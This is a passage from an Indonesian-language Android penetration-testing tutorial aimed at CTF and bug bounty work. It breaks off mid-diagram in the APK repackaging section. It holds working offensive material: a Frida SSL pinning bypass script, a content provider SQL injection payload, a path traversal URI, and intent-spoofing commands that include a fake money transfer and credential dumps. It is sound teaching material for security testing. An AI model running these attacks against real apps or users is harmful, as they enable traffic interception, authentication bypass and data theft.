---
id: "61"
title: "⚡ Quick Start Checklist (Untuk Pemula)"
category: "8. Cloud & Mobile"
categoryId: "cloud_mobile"
filename: "61_android_apk_workflow.md"
refs_out: ["01","05","06","14a","15","28","30","55","60","62"]
refs_in: ["60","62"]
---

> **arget Environment:** Parrot OS XFCE (Debian-based)  
> **Prerequisites:** Memahami konsep dasar Linux CLI, analisis web/API dasar, dan penggunaan Burp Suite (referensi: `[01. Mindset, Metodologi, dan Workflow Pentesting — Panduan Fundamental](/docs/mindset-dan-metodologi)`, `[🧭 BAGIAN 0: FONDASI FORENSICS](/docs/forensics)`).  
> **Fokus Utama:** Static analysis, dynamic analysis, SSL pinning bypass, Frida runtime instrumentation, dan eksploitasi komponen Android untuk CTF (HackTheBox, TryHackMe, Google CTF) dan Android Bug Bounty.

---

## 📑 Daftar Isi

1. [Bagian 0: Fondasi Android Security](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-0-fondasi-android-security)
2. [Bagian 1: Setup Environment di Parrot OS](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-1-setup-environment-di-parrot-os)
3. [Bagian 2: Static Analysis Workflow](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-2-static-analysis-workflow)
4. [Bagian 3: Dynamic Analysis Workflow](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-3-dynamic-analysis-workflow)
5. [Bagian 4: SSL Pinning Bypass](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-4-ssl-pinning-bypass)
6. [Bagian 5: Exported Component Exploitation](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-5-exported-component-exploitation)
7. [Bagian 6: APK Patching & Repackaging](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-6-apk-patching--repackaging)
8. [Bagian 7: Frida Scripting untuk CTF](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-7-frida-scripting-untuk-ctf)
9. [Bagian 8: Automated Analysis dengan MobSF](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-8-automated-analysis-dengan-mobsf)
10. [Bagian 9: 8 Common CTF Android Patterns](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-9-8-common-ctf-android-patterns)
11. [Bagian 10: Decision Tree Android Pentest](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-10-decision-tree-android-pentest)
12. [Bagian 11: Common Errors & Troubleshooting](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-11-common-errors--troubleshooting)
13. [Bagian 12: Cheatsheet Copy-Paste Ready](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-12-cheatsheet-copy-paste-ready)

---

## ⚡ Quick Start Checklist (Untuk Pemula)

Ikuti urutan ini SETIAP KALI mendapatkan file APK target:

- [ ] 1. **Setup Workspace:** `mkdir -p ~/mobile_pentest/app_name/{static,dynamic,frida}`
- [ ] 2. **Konfirmasi Format:** `file target.apk`
- [ ] 3. **Decompile JADX:** `jadx -d ./jadx_out target.apk`
- [ ] 4. **Baca Manifest:** `grep exported AndroidManifest.xml` atau periksa `AndroidManifest.xml`
- [ ] 5. **Cari Hardcoded Secrets:** `grep -r "flag{" ./jadx_out`
- [ ] 6. **Install ke Emulator:** `adb install target.apk`
- [ ] 7. **Monitor Logcat:** `adb logcat | grep -i flag`
- [ ] 8. **Setup Burp Proxy:** Cek apakah traffic HTTP/HTTPS tertangkap
- [ ] 9. **Bypass SSL Pinning (Jika HTTPS diblokir):** `objection -g pkg explore --startup-command "android sslpinning disable"`
- [ ] 10. **Eksploitasi Exported Activity:** `adb shell am start -n pkg/.Activity`
- [ ] 11. **Analisis Database & Prefs:** `adb pull /data/data/pkg/databases/`
- [ ] 12. **Cari Native Secrets:** `strings static/smali_decoded/lib/*/*.so | grep -i flag`

---

## 📱 Bagian 0: Fondasi Android Security

### 0.1 Android Architecture untuk Security Tester

Android dibangun di atas kernel Linux yang dimodifikasi. Memahami arsitektur bertingkat (_layered architecture_) sangat krusial untuk menentukan di layer mana kerentanan berada atau di mana injeksi instrumentation harus dilakukan.

text

```
                  ARSITEKTUR SISTEM OPERASI ANDROID
 ┌────────────────────────────────────────────────────────────────────────┐
 │ 1. SYSTEM APPS & USER APPLICATIONS                                     │
 │    (WhatsApp, Chrome, Banking App, CTF Target APK)                     │
 ├────────────────────────────────────────────────────────────────────────┤
 │ 2. JAVA API FRAMEWORK                                                  │
 │    (Activity Manager, Content Providers, Window Manager, Package Mgr)  │
 ├────────────────────────────────────────────────────────────────────────┤
 │ 3. ANDROID RUNTIME (ART) & NATIVE C/C++ LIBRARIES (HAL)                │
 │    (ART / Dalvik Virtual Machine, libcrypto.so, libc.so, WebKit, SQLite│
 ├────────────────────────────────────────────────────────────────────────┤
 │ 4. LINUX KERNEL                                                        │
 │    (Process Sandboxing, UID/GID Isolation, Device Drivers, SELinux)    │
 └────────────────────────────────────────────────────────────────────────┘
```

#### Mengapa Setiap Layer Relevan untuk Pentester?

1. **Application Layer:** Tempat logika bisnis berjalan. Target utama decompilation, logic flaw, dan credential hardcoding.
2. **Framework Layer:** Mengatur komunikasi antar aplikasi (Intents). Celah bypass autentikasi sering terjadi karena salah mengonfigurasi permission di layer ini.
3. **ART & Native Libraries:** Tempat bytecode dieksekusi atau native code (`.so` via JNI) berjalan. Di sini kita menempelkan (_hook_) memory injector seperti **Frida**.
4. **Linux Kernel Layer:** Menyediakan isolasi keamanan paling mendasar melalui sistem UID/GID unik per aplikasi (_Sandboxing_).

> **Analogi APK untuk Pemula:**  
> File `.apk` pada dasarnya adalah sebuah file kompresi **ZIP** standar yang diubah ekstensinya. Di dalamnya terdapat:
> 
> - **Blueprint / Denah Bangunan:** `AndroidManifest.xml` (Mendefinisikan hak akses dan pintu masuk).
> - **Mesin Penggerak:** `classes.dex` (Bytecode program yang dieksekusi sistem).
> - **Dekorasi & Bahan:** `resources.arsc` dan folder `res/` (Teks, gambar, layout UI).

#### DEX Bytecode vs Java Bytecode

- **Java Standar:** Source Code (`.java`) dikompilasi oleh `javac` menjadi Java Bytecode berbasis _Stack Machine_ (`.class`).
- **Android DEX:** Seluruh file `.class` dipadatkan dan dioptimasi oleh tool `d8`/`dx` menjadi file Dalvik Executable berbasis _Register Machine_ (`classes.dex`). Arsitektur register ini dirancang khusus agar hemat memori dan baterai perangkat mobile.

---

### 0.2 Struktur & Komponen Anatomi File APK

|File / Folder|Isi / Deskripsi|Relevansi Security Pentest|
|---|---|---|
|`AndroidManifest.xml`|Deklarasi package name, permissions, activities, services, receivers, providers, flags keamanan.|**CRITICAL**|
|`classes.dex`|Bytecode Dalvik/ART hasil kompilasi kode Java/Kotlin aplikasi target.|**CRITICAL**|
|`assets/`|File mentah yang disertakan developer (sertifikat web, file konfigurasi JSON/TXT, database offline).|**HIGH**|
|`lib/`|Folder berisi shared library binary native (`.so`) per arsitektur (arm64-v8a, armeabi-v7a, x86_64).|**HIGH**|
|`resources.arsc`|Tabel biner resource yang memetakan ID XML ke string, layout, dan nilai konstanta.|**MEDIUM**|
|`res/`|Resource yang tidak dikompilasi ke dalam `resources.arsc` (misal: layout XML, icon PNG).|**LOW-MEDIUM**|
|`META-INF/`|Berkas verifikasi tanda tangan digital APK (`CERT.RSA`, `CERT.SF`, `MANIFEST.MF`).|**MEDIUM**|

---

### 0.3 Empat Komponen Inti Android (The Core Four)

Hampir seluruh _attack surface_ lokal aplikasi Android berpusat pada empat komponen berikut:

#### 1. Activity (UI Screens)

- **Fungsi:** Komponen grafis yang menampilkan antarmuka visual (layar UI) kepada pengguna (contoh: `LoginActivity`, `DashboardActivity`).
- **Vektor Serangan:** Jika sebuah activity sensitif di-export (`exported="true"`), penyerang dapat memicu activity tersebut langsung dari ADB atau aplikasi malware lokal untuk melewati (_bypass_) layar login atau autentikasi PIN/biometrik.
- **Red Flag di Manifest:** `<activity android:name=".AdminDashboardActivity" android:exported="true" />` tanpa atribut `android:permission`.

#### 2. Service (Background Tasks)

- **Fungsi:** Komponen tanpa antarmuka visual yang menjalankan tugas komputasi di latar belakang dalam durasi panjang (contoh: sinkronisasi database, download file, pemutar audio).
- **Vektor Serangan:** Menjalankan (_start_) atau mengikat (_bind_) service tanpa izin untuk memanipulasi state internal aplikasi atau memicu pembaruan data yang tidak sah.
- **Red Flag di Manifest:** `<service android:name=".DownloadService" android:exported="true" />`.

#### 3. BroadcastReceiver (Event Listeners)

- **Fungsi:** Komponen yang mendengarkan dan merespons pesan broadcast dari sistem operasi atau aplikasi lain (contoh: mendengarkan event baterai lemah, SMS masuk, atau boot selesai).
- **Vektor Serangan:** _Broadcast Injection_ — Penyerang mengirimkan pesan palsu (_spoofed broadcast_) yang memuat payload berbahaya ke receiver yang terbuka.
- **Red Flag di Manifest:** `<receiver android:name=".AlarmReceiver" android:exported="true" />` yang memproses parameter string tanpa validasi integritas.

#### 4. ContentProvider (Data Abstraction Layer)

- **Fungsi:** Mengelola akses ke repositori data terstruktur (biasanya basis data SQLite) agar dapat dibagikan secara aman antar aplikasi yang berbeda.
- **Vektor Serangan:** SQL Injection (SQLi) pada URI Content Provider atau Directory Path Traversal untuk membaca file internal aplikasi.
- **Red Flag di Manifest:** `<provider android:name=".DataProvider" android:authorities="com.target.provider" android:exported="true" />`.

---

### 0.4 Model Keamanan Android (Permissions & Intent Routing)

text

```
                       INTENT ROUTING WORKFLOW
 ┌──────────────────────┐
 │ Aplikasi Penyerang   │
 └──────────┬───────────┘
            │
            ▼ Mengirim Intent: "com.target.ACTION_VIEW"
 ┌──────────────────────┐
 │ Android OS (Binder)  │ ──► [ Cek: Apakah target diekspor? (exported=true) ]
 └──────────┬───────────┘     [ Cek: Apakah pengirim punya permission?       ]
            │
            ├─► Lolos Verifikasi ──► [ Jalankan Komponen Aplikasi Target ]
            └─► Gagal Verifikasi ──► [ Lempar SecurityException ]
```

- **Explicit Intent:** Menyebutkan nama class komponen target secara spesifik (contoh: `Intent(this, LoginActivity.class)`). Aman dari intersepsi aplikasi pihak ketiga.
- **Implicit Intent:** Hanya menyatakan aksi umum yang ingin dilakukan (contoh: `ACTION_VIEW` dengan URI `https://...`). Sistem akan mencari komponen yang memiliki `intent-filter` yang cocok.
- **Protection Level Permissions:**
    1. `normal`: Diberikan otomatis saat install (misal: akses internet `android.permission.INTERNET`).
    2. `dangerous` (Runtime): Membutuhkan persetujuan eksplisit user via pop-up dialog (misal: `CAMERA`, `READ_CONTACTS`, `ACCESS_FINE_LOCATION`).
    3. `signature`: Hanya diizinkan jika aplikasi peminta ditandatangani dengan sertifikat digital yang sama dengan aplikasi pemilik izin.

---

## 🛠️ Bagian 1: Setup Environment di Parrot OS

Jalankan rangkaian instalasi dependensi berikut untuk mempersiapkan workstation Parrot OS XFCE Anda:

Bash

```
# 1. Update repository database
sudo apt update -y

# 2. Instalasi OpenJDK 17 Runtime & Compiler
sudo apt install -y default-jdk
java -version

# 3. Instalasi ADB & Fastboot (Android SDK Platform Tools)
sudo apt install -y adb fastboot
adb version

# 4. Instalasi apktool (Decompiler & Rebuilder Smali Bytecode)
sudo apt install -y apktool
apktool -version

# 5. Instalasi JADX (Decompiler DEX to Java GUI & CLI)
JADX_VER="1.4.7"
wget "https://github.com/skylot/jadx/releases/download/v${JADX_VER}/jadx-${JADX_VER}.zip" -O /tmp/jadx.zip
sudo mkdir -p /opt/jadx
sudo unzip -q /tmp/jadx.zip -d /opt/jadx
sudo ln -sf /opt/jadx/bin/jadx /usr/local/bin/jadx
sudo ln -sf /opt/jadx/bin/jadx-gui /usr/local/bin/jadx-gui
rm /tmp/jadx.zip
jadx --version

# 6. Instalasi dex2jar
sudo apt install -y dex2jar

# 7. Instalasi Frida & Objection (Dynamic Instrumentation Engine)
pip3 install --user frida-tools objection
# Masukkan path local bin ke ~/.bashrc jika belum ada
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc
frida --version
objection version

# 8. Setup MobSF (Mobile Security Framework) via Docker
sudo apt install -y docker.io
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
# Pull image MobSF resmi:
docker pull opensecurity/mobile-security-framework-mobsf:latest

# 9. Script Otomatis Pengecekan Kesiapan Tools
cat << 'EOF' > /tmp/check_tools.sh
#!/bin/bash
echo "=== VERIFIKASI TOOLSET ANDROID PENTEST ==="
for t in java adb apktool jadx frida objection keytool jarsigner zipalign aapt apksigner; do
    which $t >/dev/null 2>&1 && echo -e "$t \t: [ OK ]" || echo -e "$t \t: [ NOT FOUND ]"
done
EOF
chmod +x /tmp/check_tools.sh && /tmp/check_tools.sh
```

---

### 1.5 Setup Android Emulator di Parrot OS

Sebelum dapat menjalankan perintah `adb devices`, Anda memerlukan Android Virtual Device (AVD) / Emulator. Berikut 3 pilihan setup emulator di Parrot OS:

#### Opsi 1: Android Studio AVD (Paling Kompatibel - Disarankan)
1. Unduh Android Studio Linux package dari website resmi [developer.android.com/studio](https://developer.android.com/studio).
2. Ekstrak dan jalankan `./android-studio/bin/studio.sh`.
3. Buka **Tools** → **Device Manager** → **Create Device**.
4. Pilih Hardware: **Pixel 3a XL** → System Image: **API 28 (Android 9.0)** atau **API 30 (Android 11.0)** arsitektur `x86_64`.
5. ⚠️ **PENTING UNTUK ROOT:** Pilih image bertuliskan **"Google APIs"** (JANGAN pilih yang bertuliskan "Google Play Store" karena image Play Store mengunci akses `adb root`).

#### Opsi 2: Genymotion (Ringan & Auto-Rooted)
1. Unduh Genymotion Personal Edition dari [genymotion.com](https://www.genymotion.com/).
2. Perangkat Genymotion berjalan di atas VirtualBox dan sudah ter-root secara otomatis dari pabrik.

#### Opsi 3: AVD via Command Line (Tanpa GUI Android Studio)
```bash
# 1. Buat AVD via CLI menggunakan SDK cmdline-tools
~/Android/Sdk/cmdline-tools/latest/bin/avdmanager create avd \
  -n "pentest_device" \
  -k "system-images;android-28;google_apis;x86_64" \
  --device "pixel_3a"

# 2. Jalankan emulator tanpa snapshot
~/Android/Sdk/emulator/emulator -avd pentest_device -no-snapshot &

# 3. Verifikasi koneksi ADB
adb devices
# Output: emulator-5554   device

# 4. Tambahkan SDK path ke ~/.bashrc
echo 'export PATH="$HOME/Android/Sdk/platform-tools:$HOME/Android/Sdk/emulator:$PATH"' >> ~/.bashrc
source ~/.bashrc
```

---

---

## 🔍 Bagian 2: Static Analysis Workflow

Static analysis adalah proses memeriksa kode sumber, metadata konfigurasi, dan resource APK tanpa mengeksekusi aplikasi.

### 2.1 Inisiasi dan Identifikasi APK Target

Bash

```
# Tentukan target APK
APK_FILE="target_app.apk"
APP_NAME=$(basename "$APK_FILE" .apk)

# Buat workspace kerja terisolasi
mkdir -p ~/mobile_pentest/"$APP_NAME"/{static,dynamic,frida,output}
cd ~/mobile_pentest/"$APP_NAME"
cp /path/to/"$APK_FILE" .

# 1. Konfirmasi format biner (Wajib teridentifikasi sebagai Zip archive)
file "$APK_FILE"

# 2. Install aapt jika belum ada di Parrot OS:
# sudo apt install -y aapt

# 3. Periksa ringkasan struktur package, versionCode, dan launcher activity
aapt dump badging "$APK_FILE" | grep -E "package:|launchable-activity:|versionCode"

# Alternatif jika aapt tidak tersedia:
# apktool d "$APK_FILE" -o /tmp/manifest_temp && cat /tmp/manifest_temp/AndroidManifest.xml | grep -E "package|activity" && rm -rf /tmp/manifest_temp
```

_Contoh Output Nyata:_

text

```
package: name='com.insecure.bank' versionCode='1' versionName='1.0'
launchable-activity: name='com.insecure.bank.LoginActivity' label='InsecureBank'
```

---

### 2.2 Dekompilasi APK (Smali vs Java)

Terdapat dua pendekatan utama dalam membongkar file APK:

1. **Decompile ke Smali (`apktool`):** Menghasilkan representasi intermediate assembly. Sempurna untuk **modifikasi instruksi byte, patching, dan repackaging**.
2. **Decompile ke Java (`JADX`):** Menghasilkan source code Java tingkat tinggi yang mudah dibaca. Sempurna untuk **audit logika bisnis, pencarian fungsi crypto, dan hunting hardcoded secrets**.

Bash

```
# METHOD 1: Decompile ke Smali menggunakan apktool
apktool d "$APK_FILE" -o static/smali_decoded -f
# Hasil: folder smali_decoded memuat AndroidManifest.xml terbaca, assets/, res/, dan file *.smali

# METHOD 2: Decompile ke Java menggunakan JADX (CLI)
jadx -d static/jadx_java "$APK_FILE" --show-bad-code
# Hasil: direktori jadx_java memuat package source code *.java utuh

# METHOD 3: Buka GUI interaktif JADX (Sangat disarankan untuk pembacaan menyeluruh)
jadx-gui "$APK_FILE" &
```

---

### 2.3 Analisis Manifest (`AndroidManifest.xml`)

Buka dan periksa file konfigurasi utama di `static/smali_decoded/AndroidManifest.xml`.

Bash

```
MANIFEST="static/smali_decoded/AndroidManifest.xml"

# 1. Ekstraksi daftar permissions yang diminta aplikasi
grep -E "uses-permission" "$MANIFEST" | awk -F'"' '{print $2}' | sort -u

# 2. Cari seluruh komponen yang terekspos ke publik (exported="true")
grep -n 'android:exported="true"' "$MANIFEST"

# 3. Analisis izin backup data lokal
grep -i 'android:allowBackup' "$MANIFEST"

# 4. Analisis status debuggable (Jika bernilai true, debugger dapat di-attach pada runtime)
grep -i 'android:debuggable' "$MANIFEST"
```

#### Tabel Evaluasi Red Flags Manifest:

|Atribut Manifest|Nilai Rentan|Konsekuensi Keamanan|Tindakan Pentester|
|---|---|---|---|
|`android:exported`|`"true"`|Komponen dapat dipicu oleh aplikasi pihak ketiga tanpa otentikasi.|Uji via ADB Activity Manager (`am`).|
|`android:allowBackup`|`"true"`|Data sandbox `/data/data/<pkg>` dapat di-dump via `adb backup` tanpa root.|Coba dump file SQLite/SharedPrefs via backup.|
|`android:debuggable`|`"true"`|Aplikasi mengizinkan injection Java Debug Wire Protocol (JDWP).|Pasang breakpoint via `jdb` untuk dump memori.|
|`networkSecurityConfig`|_Tidak Ada_|Mengizinkan cleartext HTTP traffic secara default pada Android 6 ke bawah.|Intersepsi plaintext HTTP di Burp Suite.|

---

### 2.4 Hunting Hardcoded Secrets & Endpoints

Developer sering melakukan kesalahan fatal dengan meninggalkan token otentikasi, API keys pihak ketiga, atau flag CTF langsung di dalam source code atau file konfigurasi string.

Bash

```
JADX_DIR="static/jadx_java"

# 1. Cari API Key, Secret Token, dan Kredensial Umum
grep -rnwi "$JADX_DIR" -e "api_key" -e "apikey" -e "secret" -e "password" -e "bearer" --include="*.java" | grep -v "//" | head -n 25

# 2. Cari Endpoint API Backend dan Hardcoded URL
grep -rnEo "https?://[a-zA-Z0-9./?=_-]*" "$JADX_DIR" | sort -u | grep -v "schemas.android.com" | head -n 20

# 3. Cari Cloud Credentials (AWS, Firebase, Google Services)
grep -rnE "AKIA[0-9A-Z]{16}" "$JADX_DIR"
grep -rnEi "firebaseio\.com|default_web_client_id" "$JADX_DIR"

# 4. Cari nilai rahasia di dalam compiled resources (strings.xml)
find static/smali_decoded/res/ -type f -name "strings.xml" -exec grep -iE "key|token|flag|secret|auth" {} +

# 5. Cari file rahasia di folder assets
find static/smali_decoded/assets/ -type f -exec strings {} + | grep -iE "flag\{|secret|admin"
```

---

### 2.5 Analisis Network Security Configuration

File `res/xml/network_security_config.xml` menentukan kebijakan komunikasi TLS aplikasi.

Bash

```
NETCONFIG=$(find static/smali_decoded/res/xml/ -name "network_security_config.xml")
if [ -f "$NETCONFIG" ]; then
    echo "[+] File Network Security Config Ditemukan:"
    cat "$NETCONFIG"
else
    echo "[-] File Network Security Config tidak ditemukan (Mengikuti konfigurasi default OS)."
fi
```

_Contoh Konfigurasi Rentan (Cleartext Traffic Diizinkan):_

XML

```
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" /> <!-- RENTAN: Mempercayai sertifikat yang dipasang user (Burp Cert) -->
        </trust-anchors>
    </base-config>
</network-security-config>
```

---

## 🏃 Bagian 3: Dynamic Analysis Workflow

Dynamic analysis dilakukan dengan menjalankan APK di dalam emulator atau physical device yang dikendalikan melalui ADB (_Android Debug Bridge_).

### 3.1 Setup Device & Verifikasi ADB

Bash

```
# 1. Tampilkan daftar perangkat yang terdeteksi
adb devices -l

# Jika muncul status 'unauthorized': Buka layar Android device dan klik "Allow USB Debugging".
# Jika status 'device', koneksi berhasil dibentuk:
# emulator-5554    device product:sdk_gphone64_x86_64 model:sdk_gphone64_x86_64

# 2. Dapatkan shell root di dalam emulator
adb shell
# Verifikasi hak akses:
# root@generic_x86_64:/ # id
# uid=0(root) gid=0(root)
exit
```

---

### 3.2 Instalasi & Runtime Monitoring (Logcat)

Bash

```
# 1. Pasang APK ke perangkat
adb install -r "$APK_FILE"

# 2. Dapatkan Package Name aplikasi yang terpasang
PKG=$(aapt dump badging "$APK_FILE" | grep package | awk -F"'" '{print $2}')
echo "[*] Target Package: $PKG"

# 3. Bersihkan log buffer dan monitor logcat secara real-time untuk mencari leak flag
adb logcat -c
adb logcat | grep -iE "$PKG|flag|key|secret|token|crypto"
```

---

### 3.3 Analisis Local Storage & Database Sandbox

Setiap aplikasi menyimpan status data lokalnya di direktori privat: `/data/data/<package_name>/`.

Bash

```
# 1. Pindah ke direktori data aplikasi (memerlukan root)
adb shell "ls -la /data/data/$PKG"

# 2. Inspeksi SharedPreferences (Penyimpanan XML key-value untuk token/PIN/flags)
adb shell "ls -la /data/data/$PKG/shared_prefs/"
adb shell "cat /data/data/$PKG/shared_prefs/*.xml"

# 3. Analisis dan Ekstraksi Database SQLite
adb shell "ls -la /data/data/$PKG/databases/"
# Salin file database ke workstation Parrot OS untuk dianalisis
adb pull "/data/data/$PKG/databases/" ./output/databases/

# Bedah isi database menggunakan SQLite3 CLI
sqlite3 ./output/databases/*.db ".tables"
sqlite3 ./output/databases/*.db "SELECT * FROM users;"
sqlite3 ./output/databases/*.db ".dump"
```

---

### 3.4 Intersepsi Network Traffic Menggunakan Burp Suite

1. **Setting Proxy di Workstation Parrot OS:**  
    Buka Burp Suite →→ **Proxy** →→ **Proxy settings** →→ **Proxy listeners** →→ Bind ke `All interfaces` pada port `8080`.
2. **Setting Proxy di Emulator:**  
    Buka **Settings** di Android →→ **Network & internet** →→ **Internet** →→ Klik gear ikon Wi-Fi (`AndroidWifi`) →→ Edit →→ **Proxy** set ke `Manual` →→ Isi IP Parrot OS (misal: `192.168.1.50`) dan Port `8080`.
3. **Memasang Sertifikat Burp Suite:**
    
    Bash
    
    ```
    # Ekspor sertifikat dari Burp Suite dalam format DER: cacert.der
    # Konversi ke format PEM:
    openssl x509 -inform DER -in cacert.der -out burp.pem
    # Hitung hash subjek sertifikat (Android versi lawas format):
    HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -n 1)
    mv burp.pem "${HASH}.0"
    
    # Push sertifikat langsung ke System Certificate Store (Perlu root & remount /system):
    adb root
    adb remount
    adb push "${HASH}.0" /system/etc/security/cacerts/
    adb shell chmod 644 /system/etc/security/cacerts/"${HASH}.0"
    adb reboot
    ```
    

---

## 🛡️ Bagian 4: SSL Pinning Bypass

_SSL/TLS Certificate Pinning_ adalah mekanisme keamanan di mana aplikasi menolak mempercayai root CA sistem/user, dan hanya mempercayai sertifikat publik atau public key hash tertentu yang di-hardcode di dalam binary aplikasi.

### 4.1 Identifikasi SSL Pinning pada Source Code

Cari implementasi library pinning populer di source Java:

Bash

```
grep -rnwi "$JADX_DIR" -e "CertificatePinner" -e "checkServerTrusted" -e "PinSet" -e "X509TrustManager"
```

---

### 4.2 Bypass Menggunakan Objection (Metode Otomatis)

Objection menggunakan Frida di latar belakang untuk melakukan hooking otomatis pada ratusan class crypto/TLS umum (OkHttp, TrustManager, NetworkSecurityConfig).

Bash

```
# 1. Setup & jalankan frida-server di emulator/device
# Step 1a: Cek versi Frida client di Parrot OS
FRIDA_VER=$(frida --version)
echo "[*] Frida Client Version: $FRIDA_VER"

# Step 1b: Cek arsitektur CPU emulator via ADB
ABI=$(adb shell getprop ro.product.cpu.abi | tr -d '\r')
echo "[*] Device CPU ABI: $ABI"

# Step 1c: Unduh frida-server binary yang matching dari GitHub Releases
# Untuk emulator x86_64:
wget "https://github.com/frida/frida/releases/download/${FRIDA_VER}/frida-server-${FRIDA_VER}-android-${ABI}.xz" -O /tmp/frida-server.xz
unxz /tmp/frida-server.xz
mv /tmp/frida-server /tmp/frida-server-bin

# Step 1d: Push ke device, atur permission 755, dan jalankan di background (perlu root)
adb push /tmp/frida-server-bin /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# 2. Verifikasi frida dapat membaca proses di device
frida-ps -U

# 3. Jalankan aplikasi di bawah kendali Objection
objection -g "$PKG" explore

# 4. Di dalam konsol interaktif Objection, nonaktifkan SSL Pinning:
# com.target.app on (google: 11) [usb] # android sslpinning disable
```

_Kembali ke Burp Suite: Seluruh traffic HTTPS sekarang berhasil di-dekripsi dan ditampilkan secara transparan._

---

### 4.3 Bypass Menggunakan Custom Frida Script

Jika Objection gagal (misalnya karena custom pinning implementation), gunakan custom Frida JavaScript berikut.

Simpan script sebagai `ssl_bypass.js`:

JavaScript

```
/*
 * Universal Android SSL Pinning Bypass Script
 * Target: OkHttp3, TrustManagerImpl, dan Default HttpClient
 */
Java.perform(function () {
    console.log("[*] Memulai Universal SSL Pinning Bypass...");

    // 1. Bypass OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function (hostname, peerCertificates) {
            console.log('[+] Bypassed OkHttp3 CertificatePinner untuk host: ' + hostname);
            return; // Kembalikan void tanpa melempar exception
        };
    } catch (err) {
        console.log('[-] OkHttp3 CertificatePinner tidak ditemukan.');
    }

    // 2. Bypass TrustManagerImpl (Android Conscrypt)
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log('[+] Bypassed TrustManagerImpl verifyChain untuk host: ' + host);
            return untrustedChain; // Kembalikan certificate chain langsung
        };
    } catch (err) {
        console.log('[-] TrustManagerImpl Conscrypt tidak ditemukan.');
    }

    // 3. Bypass Custom X509TrustManager
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        
        var TrustManager = Java.registerClass({
            name: 'com.custom.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function (chain, authType) {},
                checkServerTrusted: function (chain, authType) {},
                getAcceptedIssuers: function () { return []; }
            }
        });

        var TrustManagers = [TrustManager.$new()];
        var SSLContext_init = SSLContext.init.overload(
            '[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom'
        );
        SSLContext_init.implementation = function (keyManager, trustManager, secureRandom) {
            console.log('[+] Overriding SSLContext dengan permissive TrustManager.');
            SSLContext_init.call(this, keyManager, TrustManagers, secureRandom);
        };
    } catch (err) {
        console.log('[-] Gagal override X509TrustManager.');
    }
});
```

Jalankan script menggunakan Frida CLI:

Bash

```
frida -U -f "$PKG" -l ssl_bypass.js --no-pause
```

---

## 🎯 Bagian 5: Exported Component Exploitation

### 5.1 Eksploitasi Exported Activity

Jika activity login atau admin memiliki atribut `android:exported="true"`, activity tersebut dapat dipicu secara paksa dari luar menggunakan command `am start`:

Bash

```
# 1. Pemicuan Activity Dasar tanpa parameter
adb shell am start -n "$PKG/.AdminActivity"

# 2. Pemicuan Activity dengan Extra Data (String & Boolean injection)
# Skenario: Developer mengecek if (getIntent().getBooleanExtra("isAdmin", false))
adb shell am start -n "$PKG/.AdminDashboardActivity" \
    --ez "isAdmin" true \
    --es "username" "administrator"

# 3. Pemicuan Deep Link / URL Scheme Intent
# Skenario: Activity menerima data via custom URI scheme (target://verify?token=...)
adb shell am start -a "android.intent.action.VIEW" \
    -d "insecurebank://transfer?amount=1000000&to=attacker"
```

---

### 5.2 Eksploitasi Content Provider

Content Provider yang terbuka dapat di-query menggunakan perintah `content query`.

Bash

```
# 1. Query seluruh data dari content URI
adb shell content query --uri "content://com.insecure.bank.provider/accounts"

# 2. Menguji Celah SQL Injection pada parameter --where
# Injeksi klausa Boolean True:
adb shell content query --uri "content://com.insecure.bank.provider/users" \
    --where "1=1) UNION SELECT 1,username,password,flag,5 FROM secret_table--"

# 3. Menguji Path Traversal pada File-based Content Provider
adb shell content read --uri "content://com.insecure.bank.fileprovider/../../../../data/data/$PKG/shared_prefs/secret.xml"
```

---

### 5.3 Eksploitasi Broadcast Receiver

Bash

```
# 1. Kirim pesan broadcast terarah ke receiver tertentu
adb shell am broadcast -a "com.insecure.bank.ACTION_UNLOCK" \
    -n "$PKG/.receivers.BackdoorReceiver" \
    --es "secret_code" "CTF_MASTER_KEY_2024"

# 2. Dump status registrasi broadcast aktif di memori
adb shell dumpsys activity broadcasts | grep -A 5 "$PKG"
```

---

## 🩹 Bagian 6: APK Patching & Repackaging

Patching digunakan ketika aplikasi memiliki validasi lokal seperti **Root Detection**, **Emulator Detection**, atau **Integrity/Signature Check** yang menghalangi pengujian.

text

```
                   APK PATCHING PIPELINE WORKFLOW
 ┌───────────────┐        ┌───────────────┐        ┌───────────────┐
 │ apktool d     │ ──►    │ Edit Smali    │ ──►    │ apktool b     │
 │ (Decompile)   │        │ Instructions  │        │ (Recompile)   │
 └───────────────┘        └───────────────┘        └───────┬───────┘
                                                           │
 ┌───────────────┐        ┌───────────────┐                │
 │ adb install   │ ◄──    │ zipalign /    │ ◄──────────────┘
